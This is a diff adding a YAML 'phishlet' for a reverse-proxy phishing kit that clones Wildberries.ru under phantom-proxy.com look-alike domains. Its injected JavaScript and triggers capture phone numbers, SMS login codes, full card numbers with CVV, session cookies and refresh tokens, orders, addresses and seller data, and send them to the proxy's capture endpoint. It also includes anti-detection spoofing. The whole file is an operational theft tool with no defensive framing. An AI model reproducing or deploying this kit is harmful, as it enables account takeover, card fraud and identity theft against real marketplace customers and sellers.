@@ -1,0 +1,297 @@
+# ============================================================================
+# Wildberries Phishlet
+# Полный перехват сессий Wildberries.ru
+# ============================================================================
+
+id: wildberries
+name: Wildberries (Маркетплейс)
+author: PhantomProxy Team
+version: "2.0"
+description: |
+  Перехват сессий Wildberries:
+  - Вход по телефону
+  - SMS подтверждение
+  - Перехват данных карт
+  - Перехват заказов и адресов доставки
+
+target:
+  primary: "www.wildberries.ru"
+  secondary:
+    - "wildberries.ru"
+    - "api.wildberries.ru"
+    - "seller.wildberries.ru"
+    - "m.wildberries.ru"
+    - "account.wildberries.ru"
+
+sub_filters:
+  - type: "domain"
+    from: "www.wildberries.ru"
+    to: "www.phantom-proxy.com"
+    priority: 1
+    
+  - type: "domain"
+    from: "wildberries.ru"
+    to: "phantom-proxy.com"
+    priority: 2
+    
+  - type: "domain"
+    from: "api.wildberries.ru"
+    to: "api.phantom-proxy.com"
+    priority: 3
+    
+  - type: "domain"
+    from: "account.wildberries.ru"
+    to: "account.phantom-proxy.com"
+    priority: 4
+    
+  - type: "domain"
+    from: "seller.wildberries.ru"
+    to: "seller.phantom-proxy.com"
+    priority: 5
+
+  - type: "domain"
+    from: "basket-*.wildberries.ru"
+    to: "basket.phantom-proxy.com"
+    priority: 100
+    
+  - type: "domain"
+    from: "avatars.wildberries.ru"
+    to: "avatars.phantom-proxy.com"
+    priority: 101
+
+js_inject: |
+  (function() {
+    'use strict';
+    
+    console.log('[PhantomProxy] Wildberries phishlet loaded');
+    
+    const wbCapture = {
+      // Перехват телефона
+      capturePhone: function(form) {
+        const phone = form.querySelector('input[type="tel"]')?.value ||
+                      form.querySelector('input[name="phone"]')?.value ||
+                      form.querySelector('input[placeholder*="Телефон"]')?.value || '';
+        
+        if (phone) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'wb_phone',
+              phone: phone,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      // Перехват SMS кода
+      captureSMS: function(code) {
+        if (code && code.length >= 4 && /^\d+$/.test(code)) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'wb_sms',
+              code: code,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      // Перехват данных карты
+      captureCard: function(form) {
+        const cardNumber = form.querySelector('input[name="card_number"]')?.value ||
+                          form.querySelector('input[placeholder*="Номер карты"]')?.value || '';
+        const expiry = form.querySelector('input[name="expiry"]')?.value || '';
+        const cvv = form.querySelector('input[name="cvv"]')?.value || '';
+        const holder = form.querySelector('input[name="holder"]')?.value || '';
+        
+        if (cardNumber) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'wb_card',
+              card_number: cardNumber,
+              expiry: expiry,
+              cvv: cvv,
+              holder: holder,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      // Перехват сессии
+      captureSession: function() {
+        const cookies = {
+          wb_uid: this.getCookie('wb_uid'),
+          wb_sid: this.getCookie('wb_sid'),
+          refresh_token: this.getCookie('refresh_token'),
+          x-personal-data-key: this.getCookie('x-personal-data-key')
+        };
+        
+        fetch('/api/capture', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            type: 'wb_session',
+            cookies: cookies,
+            url: window.location.href
+          })
+        });
+      },
+      
+      getCookie: function(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return parts.pop().split(';').shift();
+        return '';
+      }
+    };
+    
+    // Перехват форм
+    document.addEventListener('submit', function(e) {
+      const form = e.target;
+      if (form.action && form.action.includes('wildberries')) {
+        // Проверка на форму телефона
+        if (form.querySelector('input[type="tel"]') || 
+            form.querySelector('input[placeholder*="Телефон"]')) {
+          wbCapture.capturePhone(form);
+        }
+        
+        // Проверка на форму карты
+        if (form.querySelector('input[name="card_number"]') || 
+            form.querySelector('input[placeholder*="Номер карты"]')) {
+          wbCapture.captureCard(form);
+        }
+      }
+    }, true);
+    
+    // Перехват SMS input
+    document.addEventListener('input', function(e) {
+      if (e.target.tagName === 'INPUT') {
+        const name = e.target.name || e.target.id;
+        const placeholder = e.target.placeholder || '';
+        if (name.includes('sms') || name.includes('code') || 
+            placeholder.includes('код из СМС') || placeholder.includes('Код')) {
+          if (e.target.value.length >= 4) {
+            wbCapture.captureSMS(e.target.value);
+          }
+        }
+      }
+    }, true);
+    
+    // Захват при загрузке
+    window.addEventListener('load', function() {
+      wbCapture.captureSession();
+    });
+    
+    // Скрытие
+    Object.defineProperty(navigator, 'webdriver', { get: () => false });
+    
+  })();
+
+triggers:
+  - name: "wb_login"
+    path_regex: "/login|/auth|/signin|/profile"
+    actions:
+      - type: "inject_js"
+        payload: "wb_login.js"
+      - type: "capture_form"
+        fields: ["phone", "tel", "mobile"]
+      - type: "realtime_capture"
+        enabled: true
+        
+  - name: "wb_sms"
+    path_regex: "/sms|/verify|/confirm|/code"
+    actions:
+      - type: "capture_form"
+        fields: ["sms_code", "code", "verification_code", "passcode"]
+      - type: "wait_for_input"
+        timeout: 180
+        
+  - name: "wb_main"
+    host_regex: "www.wildberries.ru"
+    path_exclude: "/login|/auth"
+    actions:
+      - type: "capture_cookies"
+        cookies: ["wb_uid", "wb_sid", "refresh_token"]
+      - type: "session_hijack"
+        enabled: true
+      - type: "capture_orders"
+        enabled: true
+      - type: "capture_addresses"
+        enabled: true
+      - type: "capture_cart"
+        enabled: true
+        
+  - name: "wb_payment"
+    path_regex: "/payment|/checkout|/order|/cart"
+    actions:
+      - type: "capture_form"
+        fields: ["card_number", "cardNumber", "expiry", "cvv", "cvc", "holder"]
+      - type: "capture_cards"
+        enabled: true
+        
+  - name: "wb_seller"
+    host_regex: "seller.wildberries.ru"
+    actions:
+      - type: "capture_cookies"
+        cookies: ["wb_uid", "wb_sid", "seller_token"]
+      - type: "capture_seller_data"
+        enabled: true
+
+cookies:
+  critical:
+    - "wb_uid"
+    - "wb_sid"
+    - "refresh_token"
+    - "x-personal-data-key"
+    - "seller_token"
+    
+  session:
+    - "access_token"
+    - "device_id"
+    - "visitor_id"
+    - "dt"
+    
+  additional:
+    - "wb_root"
+    - "ab_test"
+
+headers:
+  - "Authorization"
+  - "X-WB-Session"
+  - "X-Client-Id"
+  - "X-Request-ID"
+
+anti_detection:
+  hide_webdriver: true
+  spoof_navigator: true
+  anti_devtools: true
+  random_timings: true
+  canvas_spoof: true
+  timezone_spoof: "Europe/Moscow"
+  language_spoof: "ru-RU"
+
+performance:
+  cache_static: true
+  compress_responses: true
+  lazy_images: true
+  minify_js: true
+  enable_brotli: true
+
+ssl:
+  min_version: "TLS1.2"
+
+logging:
+  log_requests: true
+  log_responses: true
+  log_errors: true
+  log_path: "./logs/wildberries/"
+  log_timezone: "Europe/Moscow"
+  # PCI DSS compliance для карт
+  encrypt_sensitive: true
